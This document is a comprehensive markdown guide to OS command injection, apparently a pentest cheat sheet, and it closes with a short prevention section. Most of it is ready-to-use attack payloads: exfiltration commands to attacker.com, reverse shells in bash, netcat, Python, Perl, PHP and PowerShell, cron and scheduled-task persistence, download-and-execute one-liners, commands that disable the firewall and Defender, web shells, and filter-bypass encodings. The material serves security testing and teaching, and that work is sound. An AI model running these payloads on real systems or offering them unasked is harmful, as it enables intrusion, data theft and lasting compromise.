# Command Injection - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Techniques](#exploitation-techniques)
6. [OS-Specific Payloads](#os-specific-payloads)
7. [Bypass Techniques](#bypass-techniques)
8. [Advanced Scenarios](#advanced-scenarios)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Command Injection (also called OS Command Injection or Shell Injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application.

**Impact**:
- Complete system compromise
- Data exfiltration
- Malware installation
- Privilege escalation
- Lateral movement in network
- Denial of Service

**Common Vulnerable Features**:
- Ping/Network diagnostic tools
- File operations (compress, convert)
- System information utilities
- Backup/restore functionality
- Image/video processing
- PDF generation

---

## Attack Mechanics

### Command Separators

**Unix/Linux**:
```bash
;       # Sequential execution
|       # Pipe output
||      # Execute if previous fails
&       # Background execution
&&      # Execute if previous succeeds
`cmd`   # Command substitution
$(cmd)  # Command substitution
\n      # Newline (URL-encoded: %0A)
```

**Windows**:
```cmd
&       # Sequential execution
|       # Pipe output
||      # Execute if previous fails
&&      # Execute if previous succeeds
%0A     # Newline
```

### Basic Injection Patterns

```bash
# Original command
ping -c 4 192.168.1.1

# Injected payloads
ping -c 4 192.168.1.1; whoami
ping -c 4 192.168.1.1 | whoami
ping -c 4 192.168.1.1 && whoami
ping -c 4 192.168.1.1 || whoami
ping -c 4 192.168.1.1 & whoami
ping -c 4 `whoami`
ping -c 4 $(whoami)
ping -c 4 192.168.1.1%0Awhoami
```

---

## Detection Techniques

### Manual Testing

**Step 1: Identify Execution Points**
```
Features that might execute commands:
- Network diagnostics (ping, traceroute, nslookup, whois)
- File operations (zip, tar, convert, resize)
- System information (uname, hostname, uptime)
- Git operations (clone, pull, commit)
- Package managers (apt, pip, npm)
```

**Step 2: Basic Probes**

```bash
# Time-based detection (most reliable)
; sleep 5
| sleep 5
& sleep 5 &
&& sleep 5
|| sleep 5
`sleep 5`
$(sleep 5)

# Windows
& timeout /t 5
&& timeout /t 5
| ping -n 6 127.0.0.1

# If response delayed by 5 seconds → vulnerable
```

**Step 3: Output-based Detection**

```bash
# Try to see command output
; whoami
; id
; pwd
; ls
; cat /etc/passwd

# Windows
& whoami
& dir
& type C:\Windows\win.ini
```

**Step 4: Blind Detection (OOB)**

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com

# HTTP callback
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(whoami)

# Pingback
; ping -c 2 attacker.com
```

### Error-Based Detection

```bash
# Intentional errors
; ls /nonexistent
; cat /etc/shadow  (permission denied)
; invalid_command

# Look for:
# - Bash error messages
# - Command not found errors
# - Permission denied errors
# - File system paths in errors
```

---

## Scanning Tools

### 1. Commix

```bash
# Basic scan
python commix.py --url="https://target.com/ping?ip=127.0.0.1"

# POST request
python commix.py --url="https://target.com/exec" --data="cmd=test"

# Specific parameter
python commix.py --url="https://target.com/page?id=1&ip=test" -p ip

# Cookie injection
python commix.py --url="https://target.com/page" --cookie="ip=*"

# Header injection
python commix.py --url="https://target.com/page" --header="X-Forwarded-For:*"

# Technique selection
python commix.py --url="https://target.com/ping?ip=test" --technique=c  # Classic
python commix.py --url="https://target.com/ping?ip=test" --technique=t  # Time-based
python commix.py --url="https://target.com/ping?ip=test" --technique=f  # File-based

# OS shell
python commix.py --url="https://target.com/ping?ip=test" --os-shell

# Execute single command
python commix.py --url="https://target.com/ping?ip=test" --os-cmd="whoami"

# File operations
python commix.py --url="https://target.com/ping?ip=test" --file-read="/etc/passwd"
python commix.py --url="https://target.com/ping?ip=test" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Reverse shell
python commix.py --url="https://target.com/ping?ip=test" --reverse-tcp="attacker.com:4444"

# Enumeration
python commix.py --url="https://target.com/ping?ip=test" --hostname
python commix.py --url="https://target.com/ping?ip=test" --current-user
python commix.py --url="https://target.com/ping?ip=test" --sys-info

# Level & risk
python commix.py --url="https://target.com/ping?ip=test" --level=3 --risk=2

# Proxy
python commix.py --url="https://target.com/ping?ip=test" --proxy=http://127.0.0.1:8080

# Custom User-Agent
python commix.py --url="https://target.com/ping?ip=test" --user-agent="CustomAgent/1.0"

# Verbose
python commix.py --url="https://target.com/ping?ip=test" -v
```

### 2. Burp Suite

**Intruder Setup**:
```
1. Send request to Intruder
2. Mark injection point
3. Load payload list:
   - Simple payloads: ; whoami, | id, && cat /etc/passwd
   - Time-based: ; sleep 5, | sleep 10
4. Configure Grep-Match for: uid=, root:, etc.
5. Check response times
6. Analyze responses
```

**Payloads List**:
```bash
; whoami
| whoami
& whoami
&& whoami
|| whoami
`whoami`
$(whoami)
%0Awhoami
; id
| cat /etc/passwd
&& ls -la
```

**Collaborator**:
```bash
; nslookup BURP-COLLABORATOR
; curl http://BURP-COLLABORATOR
```

### 3. OWASP ZAP

```bash
# Command-line scan
zap-cli active-scan https://target.com/ping?ip=127.0.0.1

# With authentication
zap-cli --api-key KEY active-scan https://target.com
```

**Manual Fuzzing**:
```
1. Intercept request
2. Right-click → Attack → Fuzz
3. Add command injection payloads
4. Analyze responses
```

### 4. Manual Testing Tools

**curl**:
```bash
# GET request
curl "https://target.com/ping?ip=127.0.0.1;whoami"

# URL-encoded
curl "https://target.com/ping?ip=127.0.0.1%3Bwhoami"

# POST request
curl -X POST https://target.com/exec -d "cmd=127.0.0.1;whoami"

# Time-based
time curl "https://target.com/ping?ip=127.0.0.1;sleep+5"
```

**Python Script**:
```python
import requests
import time

url = "https://target.com/ping"
payloads = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5 &",
    "$(sleep 5)",
    "`sleep 5`"
]

for payload in payloads:
    start = time.time()
    r = requests.get(url, params={"ip": f"127.0.0.1{payload}"})
    elapsed = time.time() - start

    if elapsed >= 5:
        print(f"[+] Vulnerable to: {payload}")
        print(f"[+] Response time: {elapsed}s")
        break
```

---

## Exploitation Techniques

### Information Gathering

```bash
# System information
; uname -a
; cat /etc/os-release
; hostname
; id
; whoami

# Windows
& systeminfo
& hostname
& whoami
& ver

# Network configuration
; ifconfig
; ip addr
; netstat -an

# Windows
& ipconfig
& netstat -an

# User enumeration
; cat /etc/passwd
; cat /etc/shadow  # Requires root
; w
; who

# Windows
& net user
& net localgroup administrators

# Process listing
; ps aux
; ps -ef

# Windows
& tasklist

# File system
; ls -la /
; find / -name "*.conf" 2>/dev/null
; cat /var/www/html/config.php

# Windows
& dir C:\
& type C:\inetpub\wwwroot\web.config
```

### Data Exfiltration

```bash
# HTTP exfiltration
; curl http://attacker.com/exfil -d "$(cat /etc/passwd)"
; wget --post-data="$(cat /etc/passwd)" http://attacker.com/exfil

# DNS exfiltration
; nslookup $(cat /etc/hostname).attacker.com

# Base64 encode before exfil
; curl http://attacker.com/$(cat /etc/passwd | base64)

# FTP exfiltration
; curl -T /etc/passwd ftp://attacker.com --user user:pass

# Email exfiltration
; mail -s "Data" attacker@evil.com < /etc/passwd

# Netcat
; cat /etc/passwd | nc attacker.com 4444
```

### Reverse Shells

**Bash**:
```bash
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**Netcat**:
```bash
; nc -e /bin/bash attacker.com 4444
; nc attacker.com 4444 | /bin/bash | nc attacker.com 5555
; rm -f /tmp/p; mknod /tmp/p p && nc attacker.com 4444 0/tmp/p
```

**Python**:
```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Perl**:
```bash
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**PHP**:
```bash
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PowerShell (Windows)**:
```powershell
& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Persistence

```bash
# Add SSH key
; echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Create cron job
; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# Add user
; useradd -m hacker -s /bin/bash
; echo "hacker:password" | chpasswd
; usermod -aG sudo hacker

# Windows - Create scheduled task
& schtasks /create /tn "Update" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" /sc minute /mo 5
```

### Privilege Escalation

```bash
# Find SUID binaries
; find / -perm -4000 2>/dev/null

# Check sudo permissions
; sudo -l

# Kernel version (search for exploits)
; uname -r

# Check writable /etc/passwd
; ls -la /etc/passwd

# Docker escape (if in container)
; fdisk -l
; mount /dev/sda1 /mnt
; chroot /mnt
```

---

## OS-Specific Payloads

### Linux/Unix

**File Operations**:
```bash
# Read files
; cat /etc/passwd
; head /etc/shadow
; tail /var/log/apache2/access.log

# Write files
; echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php

# Download files
; wget http://attacker.com/shell.sh -O /tmp/shell.sh
; curl http://attacker.com/shell.sh -o /tmp/shell.sh

# Find files
; find / -name "config.php" 2>/dev/null
; locate password | grep .txt
```

**Network Operations**:
```bash
# Port scan
; for i in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/$i" && echo "Port $i open"; done

# Download and execute
; curl http://attacker.com/malware | bash
; wget -O - http://attacker.com/malware | sh
```

### Windows

**File Operations**:
```cmd
# Read files
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Users\Administrator\Desktop\passwords.txt

# Write files
& echo ^<?php system($_GET['cmd']); ?^> > C:\inetpub\wwwroot\shell.php

# Download files
& powershell -c "Invoke-WebRequest -Uri http://attacker.com/nc.exe -OutFile C:\Windows\Temp\nc.exe"
& certutil -urlcache -f http://attacker.com/nc.exe C:\Windows\Temp\nc.exe
& bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/nc.exe C:\\Temp\\nc.exe

# Find files
& dir /s /b C:\*.config
& where /r C:\ passwords.txt
```

**System Commands**:
```cmd
# User management
& net user hacker Password123! /add
& net localgroup administrators hacker /add

# Disable firewall
& netsh advfirewall set allprofiles state off

# Disable Windows Defender
& powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

# Scheduled tasks
& schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\malware.exe" /sc onstart /ru SYSTEM
```

---

## Bypass Techniques

### 1. Space Bypasses

```bash
# Tab
;%09whoami

# $IFS (Internal Field Separator)
;cat$IFS/etc/passwd
;cat${IFS}/etc/passwd

# Brace expansion
;{cat,/etc/passwd}

# < redirection
;cat</etc/passwd

# Environment variable
;X=$'cat\x20/etc/passwd';$X
```

### 2. Keyword Filtering Bypass

**If "cat" is filtered**:
```bash
; c''at /etc/passwd
; c'a't /etc/passwd
; c\at /etc/passwd
; /bin/cat /etc/passwd
; $(which cat) /etc/passwd
; tac /etc/passwd  # reverse cat
; nl /etc/passwd   # number lines
; head /etc/passwd
; tail /etc/passwd
; more /etc/passwd
; less /etc/passwd
; xxd /etc/passwd
```

**If "bash" is filtered**:
```bash
; sh
; /bin/sh
; dash
; zsh
; $(which bash)
; b''ash
```

**If "/" is filtered**:
```bash
; cat ${HOME:0:1}etc${HOME:0:1}passwd
; cat $(echo . | tr '.' '/')etc$(echo . | tr '.' '/')passwd
```

### 3. Separator Bypass

**If ";" is filtered**:
```bash
%0A (newline)
|
&
&&
||
%0D%0A (CRLF)
```

**If "|" is filtered**:
```bash
;
&
&&
||
```

### 4. Quote/Escape Bypass

```bash
# Single quotes
; w'h'o'a'm'i

# Double quotes
; w"h"o"a"m"i

# Backslashes
; w\h\o\a\m\i

# $@ variable (empty in Bash)
; who$@ami

# Concatenation
; who''ami
```

### 5. Encoding Bypass

**Hex encoding**:
```bash
; $(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami
```

**Base64 encoding**:
```bash
; $(echo "whoami" | base64 -d)
; echo "d2hvYW1p" | base64 -d | bash
```

**Octal encoding**:
```bash
; $(printf "\167\150\157\141\155\151")  # whoami
```

### 6. Wildcard Bypass

```bash
# If exact command blocked
; /???/c?t /etc/passwd  # /bin/cat
; /???/n? -l            # /bin/nc
```

### 7. Environment Variable Bypass

```bash
# Set command in environment variable (if possible)
; CMD=whoami;$CMD
; X=$'cat /etc/passwd';$X

# Use existing environment variables
; ${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd
```

---

## Advanced Scenarios

### Time-Based Blind Injection

```bash
# Conditional execution based on condition
; [ -f /etc/passwd ] && sleep 5   # If file exists, sleep
; [ "$(id -u)" = "0" ] && sleep 5  # If root, sleep

# Extract data character by character
; [ "$(whoami | cut -c 1)" = "r" ] && sleep 5  # First char is 'r'
; [ "$(whoami | cut -c 2)" = "o" ] && sleep 5  # Second char is 'o'
```

### Out-of-Band Injection

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; host $(id).attacker.com

# HTTP exfiltration
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/$(cat /etc/passwd | base64)

# ICMP exfiltration
; ping -c 1 -p $(xxd -p /etc/passwd | head -c 32) attacker.com
```

### Second-Order Command Injection

```bash
# Payload stored in database/file, executed later
# Example: Username field
Username: ; wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh

# Later, when username is used in command:
system("generate_report --user=" + username);
# Results in:
generate_report --user=; wget http://attacker.com/shell.sh...
```

---

## Prevention & Mitigation

### 1. Avoid System Calls

```php
// BAD
system("ping -c 4 " . $_GET['ip']);

// GOOD - Use language-specific libraries
$ping = new Ping($_GET['ip']);
$result = $ping->execute();
```

**Examples**:
- **Network operations**: Use sockets, not ping/curl
- **File operations**: Use built-in file functions
- **Image processing**: Use GD/ImageMagick libraries, not exec
- **Archive operations**: Use ZipArchive, not tar command

### 2. Input Validation (Whitelist)

```php
// Validate IP address
$ip = $_GET['ip'];
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// Whitelist allowed values
$allowed_options = ['option1', 'option2', 'option3'];
if (!in_array($_GET['option'], $allowed_options)) {
    die("Invalid option");
}

// Strict regex
if (!preg_match('/^[a-zA-Z0-9\-]+$/', $_GET['filename'])) {
    die("Invalid filename");
}
```

### 3. Use Parameterized Commands

```php
// PHP - escapeshellarg/escapeshellcmd
$ip = escapeshellarg($_GET['ip']);
$output = shell_exec("ping -c 4 " . $ip);

// Python - subprocess with list
import subprocess
ip = request.GET['ip']
result = subprocess.run(['ping', '-c', '4', ip], capture_output=True)

// Node.js - child_process with array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput], (error, stdout) => {
    console.log(stdout);
});

// Java - ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", userInput);
Process p = pb.start();
```

### 4. Principle of Least Privilege

```bash
# Run application as non-privileged user
# Create dedicated user
useradd -r -s /bin/false appuser

# Application should not need:
# - Root access
# - Shell access
# - Network access (in many cases)

# Use AppArmor/SELinux to restrict
```

### 5. Disable Dangerous Functions

**PHP (php.ini)**:
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

### 6. Sandboxing

```bash
# Docker container
docker run --rm --read-only --cap-drop=ALL myapp

# chroot jail
chroot /path/to/jail /app

# systemd sandboxing
[Service]
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=yes
```

### 7. Web Application Firewall

```
# ModSecurity rules
SecRule ARGS "@rx [\;\|\`\$\(\)]" "id:1,deny,status:403,msg:'Command Injection Attempt'"
```

### 8. Monitoring & Logging

```php
// Log all system calls
error_log("Executing command with input: " . $_GET['ip']);

// Alert on suspicious patterns
if (preg_match('/[\;\|\&\$\(\)`]/', $_GET['ip'])) {
    // Log alert
    error_log("ALERT: Possible command injection attempt");
    // Block request
    die("Blocked");
}
```

### Security Checklist

- [ ] No system calls with user input
- [ ] Language-specific libraries used instead of exec
- [ ] Input validation (whitelist approach)
- [ ] Parameterized command execution
- [ ] Application runs with minimal privileges
- [ ] Dangerous functions disabled
- [ ] Sandboxing/containerization implemented
- [ ] WAF rules for command injection
- [ ] Logging and monitoring in place
- [ ] Regular security audits
- [ ] Automated security testing in CI/CD

---

**Additional Resources**:
- OWASP Command Injection
- PortSwigger OS Command Injection
- HackTricks - Command Injection
- PayloadsAllTheThings - Command Injection
